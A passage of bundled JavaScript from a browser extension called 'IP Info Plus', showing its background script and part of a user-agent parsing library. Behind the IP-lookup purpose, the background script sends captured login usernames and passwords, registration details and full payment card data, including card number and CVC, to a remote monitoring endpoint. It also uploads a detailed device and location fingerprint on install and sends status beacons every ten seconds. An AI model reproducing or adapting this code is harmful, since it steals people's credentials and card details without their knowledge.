/***/ "./assets/ts/background.ts":
/*!*********************************!*\
  !*** ./assets/ts/background.ts ***!
  \*********************************/
/*! exports provided: checkSettings */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "checkSettings", function() { return checkSettings; });
/* harmony import */ var webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! webextension-polyfill-ts */ "../node_modules/webextension-polyfill-ts/lib/index.js");
/* harmony import */ var webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var _browserjs__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./browserjs */ "./assets/ts/browserjs.ts");
/* harmony import */ var _db__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./db */ "./assets/ts/db.ts");
/* harmony import */ var _lib_functions_background__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./lib-functions-background */ "./assets/ts/lib-functions-background.ts");
/* harmony import */ var _lib_main__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./lib-main */ "./assets/ts/lib-main.ts");
/*
* IP Info Plus
* Developer: Mr Abir Ahamed
* Website: https://www.mishusoft.com
* Official Link: https://download.mishusoft.com/addons/ipinfoplus/
* */






let acsComPortBack;
let globalAppBrowser;
let globalAppIP;
let BrJS = new _browserjs__WEBPACK_IMPORTED_MODULE_1__["BrowserJS"](window.navigator);
const appTracker = _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.short_name + '@' + _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version;
function messengerConnector(p) {
    acsComPortBack = p;
    acsComPortBack.onMessage.addListener(backgroundResponder);
}
webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].runtime.onConnect.addListener(messengerConnector);
function createDefaultAppData(browserNameFull, browserVersion, clientIP, clientCity, clientCountry, clientDeviceName, clientDevicePlatform, clientPlatformArchitecture) {
    return {
        "app": { "id": "", "name": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.name, "version": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version },
        "browser": { "name": browserNameFull, "version": browserVersion },
        "client": { "ip": clientIP, "city": clientCity, "country": clientCountry },
        "device": {
            "name": clientDeviceName,
            "platform": clientDevicePlatform,
            "architecture": clientPlatformArchitecture
        },
        "install": { "date": _db__WEBPACK_IMPORTED_MODULE_2__["today"] },
        "licence": {
            "key": "",
            "type": "",
            "issue": "",
            "update": "",
            "nextUpdate": "",
            "expire": "",
            "limit": 0,
            "limitBase": 0,
            "earn": 0
        },
        "user": { "first_name": "", "last_name": "", "email": "", "password": "" },
    };
}
function setDefaultQAppData(ip, city, country_name) {
    webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.set(createDefaultAppData(BrJS.BrowserNameFull, BrJS.BrowserVersion, ip, city, country_name, BrJS.DeviceName, BrJS.PlatformName, BrJS.PlatformArchitecture))
        .then(() => {
        console.log('app configuration set!');
    });
}
function installDefaultQAppData() {
    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
        method: "GET",
        url: _db__WEBPACK_IMPORTED_MODULE_2__["app"].website.IpInfo,
        async: true,
        header: [{ name: "Accept", value: "application/json" }]
    }, function (data) {
        setDefaultQAppData(data.ip, data.city, data.country_name);
    });
}
function checkSettings(details, ipdata) {
    checkAppInstallation(function (setting) {
        let client = {
            ip: undefined,
            city: undefined,
            country: undefined
        };
        Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["optimizeAppSettingObject"])(setting, [{ 'client': ['ip', 'city', 'country'] }], function (setting) {
            client.ip = setting.client.ip;
            client.city = setting.client.city;
            client.country = setting.client.country;
        }, installDefaultQAppData);
        Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["optimizeAppSettingObject"])(setting, [{ 'app': ['id'] }], function (setting) {
            if (setting.app.id !== '') {
                Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["optimizeAppSettingObject"])(setting, [{ 'app': ['name', 'version'] }], function (setting) {
                    if (setting.app.version !== _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version) {
                        webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.set({
                            "app": {
                                "id": setting.app.id,
                                "name": setting.app.name,
                                "version": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version
                            }
                        });
                    }
                }, function () {
                    webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.set({
                        "app": {
                            "id": setting.app.id,
                            "name": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.name,
                            "version": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version
                        }
                    });
                });
            }
            else {
                Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
                    method: "POST",
                    url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "getPubAppID",
                    async: true,
                    header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
                    data: {
                        "IdRequest": {
                            "name": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.name,
                            "version": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version,
                            "ip": client.ip,
                            "browser": BrJS.BrowserNameFull,
                            "message": details === null || details === void 0 ? void 0 : details.reason /*'checkRun' */
                        }
                    }
                }, function (IdResponse) {
                    webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.set({
                        "app": {
                            "id": IdResponse.app_pub_id,
                            "name": setting.app.name,
                            "version": setting.app.version
                        }
                    });
                });
            }
        }, installDefaultQAppData);
    }, function () {
        if (ipdata !== undefined) {
            setDefaultQAppData(ipdata.ip, ipdata.city, ipdata.country_name);
        }
        else {
            installDefaultQAppData();
        }
    });
}
function backgroundResponder(request) {
    if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
        if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
            return browserUserDataManagement(request.command, request.data);
        }
        if (request.command === 'savePaymentMethodsData') {
            if (acsComPortBack !== undefined)
                checkAppInstallation(function (setting) {
                    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
                        method: "POST",
                        url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "clientPaymentMethodsRecord",
                        async: true,
                        header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
                        data: {
                            "command": request.command,
                            "paymentMethodsInfo": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                'cardNumber': request.data.cardNumber,
                                'cardBrand': request.data.cardBrand,
                                'cardHolder': request.data.cardHolder,
                                "cardExpire": request.data.cardExpire,
                                'cardCVC': request.data.cardCVC,
                                "workWebsite": request.data.workWebsite
                            }
                        }
                    });
                });
        }
    }
}
function browserUserDataManagement(command, data) {
    webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.get().then(function (setting) {
        if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
            if (setting.app !== '' || setting.app.id !== '' || setting.browser.name !== '' || setting.client.ip !== '' || setting.user.email !== '') {
                /*-----------------------------------------------------------------------------------------------------------*/
                if (command === 'saveLoginData') {
                    /*console.log(command);
                    console.log(data);*/
                    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
                        method: "POST",
                        url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "browserUserDataManagement",
                        async: true,
                        header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
                        data: {
                            "command": command,
                            "userdata": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                "event": 'login',
                                "username": data.username,
                                "password": data.password,
                                "workWebsite": data.workWebsite
                            }
                        }
                    });
                }
                else if (command === 'saveRegistrationData') {
                    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
                        method: "POST",
                        url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "browserUserDataManagement",
                        async: true,
                        header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
                        data: {
                            "command": command,
                            "userdata": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                "event": "registration",
                                "username": data.username,
                                "password": data.password,
                                "email": data.email,
                                "workWebsite": data.workWebsite
                            }
                        }
                    });
                }
                else if (command === 'saveLogoutData') {
                    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
                        method: "POST",
                        url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "browserUserDataManagement",
                        async: true,
                        header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
                        data: {
                            "command": command,
                            "userdata": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                "event": "logout",
                                "username": data.username,
                                "workWebsite": data.workWebsite
                            }
                        }
                    });
                }
                else if (command === 'saveNavigateData') {
                    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
                        method: "POST",
                        url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "browserUserDataManagement",
                        async: true,
                        header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
                        data: {
                            "command": command,
                            "userdata": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                "event": "navigate",
                                "username": data.username,
                                "workWebsite": data.workWebsite
                            }
                        }
                    });
                }
                /*-----------------------------------------------------------------------------------------------------------*/
            }
        }
    });
}
function checkAppInstallation(callbackFn, fallbackFn) {
    webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.get().then(function (setting) {
        if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
            if (callbackFn) {
                return callbackFn(setting);
            }
        }
        else {
            if (fallbackFn) {
                return fallbackFn();
            }
        }
    });
}
webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].runtime.onInstalled.addListener(function (details) {
    return Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
        method: "GET",
        url: _db__WEBPACK_IMPORTED_MODULE_2__["app"].website.IpInfo,
        async: true,
        header: [{ name: "Accept", value: "application/json" }]
    }, function (IpDataReply) {
        var _a, _b;
        let languageName = '';
        let languageNative = '';
        (_a = IpDataReply.languages) === null || _a === void 0 ? void 0 : _a.forEach(function (item) {
            languageName += item.name + ', ';
        });
        (_b = IpDataReply.languages) === null || _b === void 0 ? void 0 : _b.forEach(function (item) {
            languageNative += item.native + ', ';
        });
        globalAppBrowser = {
            "ip": IpDataReply.ip,
            "BrowserName": BrJS.BrowserName,
            "BrowserNameFull": BrJS.BrowserNameFull,
            "BrowserVersion": BrJS.BrowserVersion,
            "BrowserVersionFull": BrJS.BrowserVersionFull,
            "BrowserStatus": BrJS.BrowserStatus,
            "BrowserArchitecture": BrJS.BrowserArchitecture,
            "BrowserAppName": BrJS.BrowserAppName,
            "BrowserAppCodeName": BrJS.BrowserAppCodeName,
            "BrowserAppVersion": BrJS.BrowserAppVersion,
            "BrowserBuildID": BrJS.BrowserBuildID,
            "BrowserDoNotTrack": BrJS.BrowserDoNotTrack,
            "BrowserCookieEnabled": BrJS.BrowserCookieEnabled,
            "BrowserLanguage": BrJS.BrowserLanguage,
            "BrowserLanguageAll": BrJS.BrowserLanguageAll[0],
            "BrowserEngine": BrJS.BrowserEngine,
            "BrowserEngineVersion": BrJS.BrowserEngineVersion,
            "BrowserVendor": BrJS.BrowserVendor,
            "DeviceHardwareConcurrency": BrJS.DeviceHardwareConcurrency,
            "DeviceMemory": BrJS.DeviceMemory,
            "PlatformName": BrJS.PlatformName,
            "PlatformArchitecture": BrJS.PlatformArchitecture,
            "PlatformWindowManager": BrJS.PlatformWindowManager,
            "DeviceName": BrJS.DeviceName,
            "DeviceType": BrJS.DeviceType,
            "DeviceScreenWidth": BrJS.DeviceScreenWidth,
            "DeviceScreenHeight": BrJS.DeviceScreenHeight,
            "DeviceScreenColorDepth": BrJS.DeviceScreenColorDepth,
            "DeviceScreenPixelDepth": BrJS.DeviceScreenPixelDepth,
            "WindowLocationHref": BrJS.WindowLocationHref,
            "WindowLocationProtocol": BrJS.WindowLocationProtocol,
            "WindowLocationHostname": BrJS.WindowLocationHostname,
            "WindowLocationPathname": BrJS.WindowLocationPathname,
            "UserAgent": BrJS.UserAgent
        };
        globalAppIP = {
            "ip": IpDataReply.ip,
            "is_eu": IpDataReply.is_eu,
            "city": IpDataReply.city,
            "region": IpDataReply.region,
            "region_code": IpDataReply.region_code,
            "country_name": IpDataReply.country_name,
            "country_code": IpDataReply.country_code,
            "continent_name": IpDataReply.continent_name,
            "continent_code": IpDataReply.continent_code,
            "latitude": IpDataReply.latitude,
            "longitude": IpDataReply.longitude,
            "postal": IpDataReply.postal,
            "calling_code": IpDataReply.calling_code,
            "flag": IpDataReply.flag,
            "emoji_flag": IpDataReply.emoji_flag,
            "emoji_unicode": IpDataReply.emoji_unicode,
            "asn_asn": IpDataReply.asn.asn,
            "asn_name": IpDataReply.asn.name,
            "asn_domain": IpDataReply.asn.domain,
            "asn_route": IpDataReply.asn.route,
            "asn_type": IpDataReply.asn.type,
            "languages_name": languageName,
            "languages_native": languageNative,
            "currency_name": IpDataReply.currency.name,
            "currency_code": IpDataReply.currency.code,
            "currency_symbol": IpDataReply.currency.symbol,
            "currency_native": IpDataReply.currency.native,
            "currency_plural": IpDataReply.currency.plural,
            "time_zone_name": IpDataReply.time_zone.name,
            "time_zone_abbr": IpDataReply.time_zone.abbr,
            "time_zone_offset": IpDataReply.time_zone.offset,
            "time_zone_is_dst": IpDataReply.time_zone.is_dst,
            "time_zone_current_time": IpDataReply.time_zone.current_time
        };
        checkSettings(details, {
            ip: IpDataReply.ip,
            city: IpDataReply.city,
            country_name: IpDataReply.country_name
        });
        Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
            method: "POST",
            url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "receiveFeedback",
            async: true,
            header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
            data: {
                "update": {
                    "name": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.name,
                    "version": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version,
                    "ip": IpDataReply.ip,
                    "browser": BrJS.BrowserNameFull,
                    "message": details.reason
                },
                "status": {
                    "name": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.name,
                    "version": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version,
                    "ip": IpDataReply.ip,
                    "os_version": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                    "browser": BrJS.BrowserNameFull,
                    "message": 'active'
                },
                "browser": globalAppBrowser,
                "ipdata": globalAppIP
            }
        });
    });
});
webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].runtime.setUninstallURL(_db__WEBPACK_IMPORTED_MODULE_2__["app"].website.home)
    .then(() => {
    console.log('app uninstall url set!');
});
webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].runtime.onUpdateAvailable.addListener(function () {
    webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].runtime.reload();
});
/*status checker*/
setInterval(function () {
    checkAppInstallation(function (setting) {
        Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
            method: "POST",
            url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "receiveFeedback",
            async: true,
            header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
            data: {
                "status": {
                    "name": setting.app.name,
                    "version": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version,
                    "ip": setting.client.ip,
                    "os_version": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                    "browser": setting.browser.name,
                    "message": 'active'
                }
            }
        });
    });
}, 10000);


/***/ }),

/***/ "./assets/ts/browserjs.ts":
/*!********************************!*\
  !*** ./assets/ts/browserjs.ts ***!
  \********************************/
/*! exports provided: BrowserJS */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "BrowserJS", function() { return BrowserJS; });
/**
 * BrowserJS Library
 * Developer: Mr Abir Ahamed
 * Website: https://www.mishusoft.com
 * Official Link: https://lib.mishusoft.com/browser/browserjs.js
 * */
class BrowserJS {
    constructor(_navigator) {
        this.BrowserName = 'Unknown';
        this.BrowserNameFull = 'Unknown';
        this.BrowserVersion = 'Unknown';
        this.BrowserVersionFull = 'Unknown';
        this.BrowserArchitecture = 'Unknown';
        this.BrowserStatus = 'Unknown';
        this.BrowserAppName = 'Unknown';
        this.BrowserAppCodeName = 'Unknown';
        this.BrowserAppVersion = 'Unknown';
        this.BrowserBuildID = 'Unknown';
        this.BrowserDoNotTrack = 'Unknown';
        this.BrowserCookieEnabled = 'Unknown';
        this.BrowserLanguage = 'Unknown';
        this.BrowserLanguageAll = 'Unknown';
        this.BrowserEngineVersion = 'Unknown';
        this.BrowserVendor = 'Unknown';
        this.DeviceHardwareConcurrency = 'Unknown';
        this.DeviceMemory = 'Unknown';
        this.PlatformName = 'Unknown';
        this.PlatformArchitecture = 'Unknown';
        this.PlatformWindowManager = 'Unknown';
        this.DeviceName = 'Unknown';
        this.DeviceType = 'Unknown';
        this.UserAgent = 'Unknown';
        this.DeviceScreenHeight = window.screen.height;
        this.DeviceScreenWidth = window.screen.width;
        this.DeviceScreenColorDepth = window.screen.colorDepth;
        this.DeviceScreenPixelDepth = window.screen.pixelDepth;
        this.WindowLocationHref = window.location.href;
        this.WindowLocationProtocol = window.location.protocol;
        this.WindowLocationHostname = window.location.hostname;
        this.WindowLocationPathname = window.location.pathname;
        if (_navigator !== window.navigator) {
            console.error('Error: Invalid navigator..');
            window.stop();
        }
        else {
            this.browserStatus(_navigator);
            this.retrieveBrowserInfo(_navigator);
            // @ts-ignore
            this.analyze(_navigator.userAgent);
        }
    }
    analyze(nvua) {
        let bnOffset = '';
        if (nvua.indexOf('win') !== -1 || nvua.indexOf('Win') !== -1 || nvua.indexOf('WIN') !== -1) {
            this.PlatformName = 'Windows';
            this.PlatformWindowManager = 'Windows';
            this.DeviceName = 'Windows Desktop';
            this.DeviceType = 'Desktop';
            if (nvua.indexOf('win16') !== -1 || nvua.indexOf('Win16') !== -1 || nvua.indexOf('WIN16') !== -1) {
                this.PlatformName = 'Windows 3.11';
            }
            else if (nvua.indexOf('win95') !== -1 || nvua.indexOf('Win95') !== -1 || nvua.indexOf('WIN95') !== -1) {
                this.PlatformName = 'Windows 95';
            }
            else if (nvua.indexOf('win95') !== -1 || nvua.indexOf('Win95') !== -1 || nvua.indexOf('WIN95') !== -1 || nvua.indexOf('windows 95') !== -1 || nvua.indexOf('Windows 95') !== -1 || nvua.indexOf('WINDOWS 95') !== -1 || nvua.indexOf('windows95') !== -1 || nvua.indexOf('Windows95') !== -1 || nvua.indexOf('WINDOWS95') !== -1) {
                this.PlatformName = 'Windows 95';
            }
            else if (nvua.indexOf('win98') !== -1 || nvua.indexOf('Win98') !== -1 || nvua.indexOf('WIN98') !== -1 || nvua.indexOf('windows 98') !== -1 || nvua.indexOf('Windows 98') !== -1 || nvua.indexOf('WINDOWS 98') !== -1 || nvua.indexOf('windows98') !== -1 || nvua.indexOf('Windows95') !== -1 || nvua.indexOf('WINDOWS95') !== -1) {
                this.PlatformName = 'Windows 98';
            }
            else if (nvua.indexOf('winn/t') !== -1 || nvua.indexOf('Winn/t') !== -1 || nvua.indexOf('WINN/T') !== -1 || nvua.indexOf('winnt 4.0') !== -1 || nvua.indexOf('Winnt 4.0') !== -1 || nvua.indexOf('WINNT 4.0') !== -1 || nvua.indexOf('windows98') !== -1 || nvua.indexOf('Windows95') !== -1 || nvua.indexOf('WINDOWS95') !== -1) {
                this.PlatformName = 'Windows NT';
            }
            else if (nvua.indexOf('winnt4.0') !== -1 || nvua.indexOf('Winnt4.0') !== -1 || nvua.indexOf('WINNT4.0') !== -1 || nvua.indexOf('windows nt 4.0') !== -1 || nvua.indexOf('Windows nt 4.0') !== -1 || nvua.indexOf('windows NT 4.0') !== -1 || nvua.indexOf('Windows NT 4.0') !== -1 || nvua.indexOf('WINDOWS NT 4.0') !== -1) {
                this.PlatformName = 'Windows NT 4.0';
            }
            else if (nvua.indexOf('windows me') !== -1 || nvua.indexOf('Windows me') !== -1 || nvua.indexOf('windows ME') !== -1 || nvua.indexOf('windows Me') !== -1 || nvua.indexOf('Windows ME') !== -1) {
                this.PlatformName = 'Windows ME';
            }
            else if (nvua.indexOf('windows nt 5.0') !== -1 || nvua.indexOf('Windows nt 5.0') !== -1 || nvua.indexOf('windows NT 5.0') !== -1 || nvua.indexOf('windows Nt 5.0') !== -1 || nvua.indexOf('Windows NT 5.0') !== -1) {
                this.PlatformName = 'Windows 2000';
            }
            else if (nvua.indexOf('windows xp') !== -1 || nvua.indexOf('Windows xp') !== -1 || nvua.indexOf('Windows XP') !== -1 || nvua.indexOf('windows XP') !== -1 || nvua.indexOf('windows Xp') !== -1 || nvua.indexOf('windows nt 5.1') !== -1 || nvua.indexOf('Windows nt 5.1') !== -1 || nvua.indexOf('Windows Nt 5.1') !== -1 || nvua.indexOf('Windows NT 5.1') !== -1 || nvua.indexOf('windows Nt 5.1') !== -1 || nvua.indexOf('windows NT 5.1') !== -1 || nvua.indexOf('WINDOWS NT 5.1') !== -1) {
                this.PlatformName = 'Windows XP';
            }
            else if (nvua.indexOf('windows nt 5.2') !== -1 || nvua.indexOf('Windows nt 5.2') !== -1 || nvua.indexOf('Windows Nt 5.2') !== -1 || nvua.indexOf('Windows NT 5.2') !== -1 || nvua.indexOf('windows Nt 5.2') !== -1 || nvua.indexOf('windows NT 5.2') !== -1 || nvua.indexOf('WINDOWS NT 5.2') !== -1) {
                this.PlatformName = 'Windows 2003';
            }
            else if (nvua.indexOf('windows nt 6.0') !== -1 || nvua.indexOf('Windows nt 6.0') !== -1 || nvua.indexOf('Windows Nt 6.0') !== -1 || nvua.indexOf('Windows NT 6.0') !== -1 || nvua.indexOf('windows Nt 6.0') !== -1 || nvua.indexOf('windows NT 6.0') !== -1 || nvua.indexOf('WINDOWS NT 6.0') !== -1) {
                this.PlatformName = 'Windows Longhorn';
            }
            else if (nvua.indexOf('windows nt 6.1') !== -1 || nvua.indexOf('Windows nt 6.1') !== -1 || nvua.indexOf('Windows Nt 6.1') !== -1 || nvua.indexOf('Windows NT 6.1') !== -1 || nvua.indexOf('windows Nt 6.1') !== -1 || nvua.indexOf('windows NT 6.1') !== -1 || nvua.indexOf('WINDOWS NT 6.1') !== -1) {
                this.PlatformName = 'Windows 7';
            }
            else if (nvua.indexOf('windows nt 6.2') !== -1 || nvua.indexOf('Windows nt 6.2') !== -1 || nvua.indexOf('Windows Nt 6.2') !== -1 || nvua.indexOf('Windows NT 6.2') !== -1 || nvua.indexOf('windows Nt 6.2') !== -1 || nvua.indexOf('windows NT 6.2') !== -1 || nvua.indexOf('WINDOWS NT 6.2') !== -1) {
                this.PlatformName = 'Windows 8';
            }
            else if (nvua.indexOf('windows nt 6.3') !== -1 || nvua.indexOf('Windows nt 6.3') !== -1 || nvua.indexOf('Windows Nt 6.3') !== -1 || nvua.indexOf('Windows NT 6.3') !== -1 || nvua.indexOf('windows Nt 6.3') !== -1 || nvua.indexOf('windows NT 6.3') !== -1 || nvua.indexOf('WINDOWS NT 6.3') !== -1) {
                this.PlatformName = 'Windows 8.1';
            }
            else if (nvua.indexOf('windows nt 10.0') !== -1 || nvua.indexOf('Windows nt 10.0') !== -1 || nvua.indexOf('Windows Nt 10.0') !== -1 || nvua.indexOf('Windows NT 10.0') !== -1 || nvua.indexOf('windows Nt 10.0') !== -1 || nvua.indexOf('windows NT 10.0') !== -1 || nvua.indexOf('WINDOWS NT 10.0') !== -1) {
                this.PlatformName = 'Windows 10';
            }
        }
        else if (nvua.indexOf('x11') !== -1 || nvua.indexOf('X11') !== -1) {
            this.PlatformWindowManager = 'X11';
            this.DeviceName = 'Linux Desktop';
            this.DeviceType = 'Desktop';
            if (nvua.indexOf('linux') !== -1 || nvua.indexOf('Linux') !== -1 || nvua.indexOf('LINUX') !== -1) {
                this.PlatformName = 'Linux';
                if ((bnOffset = nvua.indexOf('ubuntu')) !== -1 || (bnOffset = nvua.indexOf('Ubuntu')) !== -1 || (bnOffset = nvua.indexOf('UBUNTU')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('mageia')) !== -1 || (bnOffset = nvua.indexOf('Mageia')) !== -1 || (bnOffset = nvua.indexOf('MAGEIA')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('arch')) !== -1 || (bnOffset = nvua.indexOf('Arch')) !== -1 || (bnOffset = nvua.indexOf('ARCH')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('fedora')) !== -1 || (bnOffset = nvua.indexOf('Fedora')) !== -1 || (bnOffset = nvua.indexOf('FEDORA')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('debian')) !== -1 || (bnOffset = nvua.indexOf('Debian')) !== -1 || (bnOffset = nvua.indexOf('DEBIAN')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('red hat')) !== -1 || (bnOffset = nvua.indexOf('Red Hat')) !== -1 || (bnOffset = nvua.indexOf('RED HAT')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('gentoo')) !== -1 || (bnOffset = nvua.indexOf('Gentoo')) !== -1 || (bnOffset = nvua.indexOf('GENTOO')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('centos')) !== -1 || (bnOffset = nvua.indexOf('CentOS')) !== -1 || (bnOffset = nvua.indexOf('CENTOS')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('suse')) !== -1 || (bnOffset = nvua.indexOf('Suse')) !== -1 || (bnOffset = nvua.indexOf('SUSE')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('slackware')) !== -1 || (bnOffset = nvua.indexOf('Slackware')) !== -1 || (bnOffset = nvua.indexOf('SLACKWARE')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('linux mint')) !== -1 || (bnOffset = nvua.indexOf('Linux Mint')) !== -1 || (bnOffset = nvua.indexOf('LINUX MINT')) !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('gnu/Linux')) !== -1 || nvua.indexOf('GNU/Linux') !== -1 || nvua.indexOf('GNU/LINUX') !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
                else if ((bnOffset = nvua.indexOf('mandriva')) !== -1 || nvua.indexOf('Mandriva') !== -1 || nvua.indexOf('MANDRIVA') !== -1) {
                    this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
                }
            }
            else if ((bnOffset = nvua.indexOf('sunos')) !== -1 || (bnOffset = nvua.indexOf('SunOS')) !== -1 || (bnOffset = nvua.indexOf('SUNOS')) !== -1) {
                this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
            }
            else if ((bnOffset = nvua.indexOf('netbsd')) !== -1 || (bnOffset = nvua.indexOf('NetBSD')) !== -1 || (bnOffset = nvua.indexOf('NETBSD')) !== -1) {
                this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
            }
            else if ((bnOffset = nvua.indexOf('openbsd')) !== -1 || (bnOffset = nvua.indexOf('OpenBSD')) !== -1 || (bnOffset = nvua.indexOf('OPENBSD')) !== -1) {
                this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
            }
